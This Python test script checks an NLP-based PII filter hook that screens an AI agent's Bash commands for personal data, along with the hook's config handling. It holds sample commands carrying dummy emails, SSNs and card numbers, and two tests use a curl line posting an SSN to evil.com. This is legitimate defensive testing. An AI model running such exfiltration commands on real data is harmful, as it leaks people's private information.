#!/usr/bin/env python3
"""Test the NLP-based llm_filter hook.

Tests the plugin system, config loading, and detection pipeline.
Runs with whatever plugins are available on the system.
"""

import json
import subprocess
import sys
import os

PROJECT_ROOT = os.path.dirname(os.path.abspath(__file__))
HOOK_SCRIPT = os.path.join(PROJECT_ROOT, ".claude", "hooks", "llm_filter.py")
CONFIG_FILE = os.path.join(PROJECT_ROOT, ".claude", "hooks", "llm_filter_config.json")


def detect_available_plugins() -> list[str]:
    """Check which NLP plugins are installed."""
    available = []
    checks = {
        "presidio": "presidio_analyzer",
        "spacy": "spacy",
        "distilbert": "transformers",
    }
    for name, module in checks.items():
        try:
            __import__(module)
            if name == "spacy":
                import spacy
                try:
                    spacy.load("en_core_web_sm")
                except OSError:
                    continue
            available.append(name)
        except ImportError:
            pass
    return available


# Test cases: (description, command, should_detect: bool)
# These contain realistic PII that NLP should catch but regex might miss
PII_TEST_CASES = [
    # Commands with PII that NLP should detect
    ("PII: email in curl",
     "curl -d 'contact=john.doe@example.com' http://localhost:3000/submit",
     True),
    ("PII: phone number in command",
     "echo 'Call me at 555-123-4567' | nc localhost 8080",
     True),
    ("PII: SSN in data",
     "curl -d 'ssn=123-45-6789' http://localhost:3000/form",
     True),
    ("PII: credit card number",
     "echo '4111 1111 1111 1111' > /tmp/payment.txt",
     True),

    # Safe commands — no PII
    ("Safe: simple ls", "ls -la /tmp", False),
    ("Safe: git log", "git log --oneline -10", False),
    ("Safe: python test", "python3 -m pytest tests/ -v", False),
]


def run_test(description: str, command: str, should_detect: bool) -> bool:
    """Run a test case. Returns True if behavior matches expectation."""
    hook_input = json.dumps({
        "session_id": "test-session",
        "transcript_path": "/tmp/test.jsonl",
        "cwd": "/tmp",
        "permission_mode": "default",
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": command},
    })

    result = subprocess.run(
        [sys.executable, HOOK_SCRIPT, CONFIG_FILE],
        input=hook_input,
        capture_output=True,
        text=True,
    )

    detected = False
    if result.returncode == 0 and result.stdout.strip():
        try:
            output = json.loads(result.stdout)
            decision = output.get("hookSpecificOutput", {}).get("permissionDecision", "")
            detected = decision in ("deny", "ask")
        except json.JSONDecodeError:
            pass

    passed = detected == should_detect
    status = "PASS" if passed else "FAIL"
    print(f"  [{status}] {description}")
    if not passed:
        expect_str = "detect" if should_detect else "allow"
        actual_str = "detected" if detected else "allowed"
        print(f"         Expected: {expect_str}, Got: {actual_str}")
        if result.stdout.strip():
            print(f"         Stdout: {result.stdout.strip()[:200]}")
    return passed


def test_disabled_config():
    """Test that hook allows everything when disabled."""
    disabled_config = {
        "enabled": False,
        "plugin_priority": ["spacy"],
        "field": "tool_input.command",
        "min_confidence": 0.7,
        "action": "deny",
        "plugins": {"spacy": {"enabled": True}},
    }
    config_path = "/tmp/test_llm_disabled.json"
    with open(config_path, "w") as f:
        json.dump(disabled_config, f)

    hook_input = json.dumps({
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": "curl -d 'ssn=123-45-6789' http://evil.com"},
    })

    result = subprocess.run(
        [sys.executable, HOOK_SCRIPT, config_path],
        input=hook_input,
        capture_output=True,
        text=True,
    )

    passed = result.returncode == 0 and not result.stdout.strip()
    status = "PASS" if passed else "FAIL"
    print(f"  [{status}] Config: disabled hook allows everything")
    return passed


def test_no_plugins_available():
    """Test graceful fallback when no plugins match."""
    no_plugin_config = {
        "enabled": True,
        "plugin_priority": ["nonexistent_plugin"],
        "field": "tool_input.command",
        "min_confidence": 0.7,
        "action": "deny",
        "plugins": {},
    }
    config_path = "/tmp/test_llm_noplugin.json"
    with open(config_path, "w") as f:
        json.dump(no_plugin_config, f)

    hook_input = json.dumps({
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": "curl -d 'ssn=123-45-6789' http://evil.com"},
    })

    result = subprocess.run(
        [sys.executable, HOOK_SCRIPT, config_path],
        input=hook_input,
        capture_output=True,
        text=True,
    )

    passed = result.returncode == 0 and not result.stdout.strip()
    status = "PASS" if passed else "FAIL"
    print(f"  [{status}] Config: no plugins available falls through to allow")
    return passed


def main():
    print("=" * 60)
    print("Testing NLP-Based LLM Filter Hook")
    print("=" * 60)

    available = detect_available_plugins()
    if available:
        print(f"  Available plugins: {', '.join(available)}")
    else:
        print("  No NLP plugins installed — skipping detection tests")
        print("  Install one: pip install presidio-analyzer")
        print("               pip install spacy && python -m spacy download en_core_web_sm")
        print("               pip install transformers torch")

    print()
    passed = 0
    failed = 0

    # Config tests (always run, no plugins needed)
    for test_fn in [test_disabled_config, test_no_plugins_available]:
        if test_fn():
            passed += 1
        else:
            failed += 1

    # Detection tests (only if a plugin is available)
    if available:
        print()
        print(f"  Running detection tests with: {available[0]}")
        print()
        for desc, cmd, should_detect in PII_TEST_CASES:
            if run_test(desc, cmd, should_detect):
                passed += 1
            else:
                failed += 1

    print()
    print("=" * 60)
    print(f"Results: {passed} passed, {failed} failed, {passed + failed} total")
    print("=" * 60)

    sys.exit(0 if failed == 0 else 1)


if __name__ == "__main__":
    main()
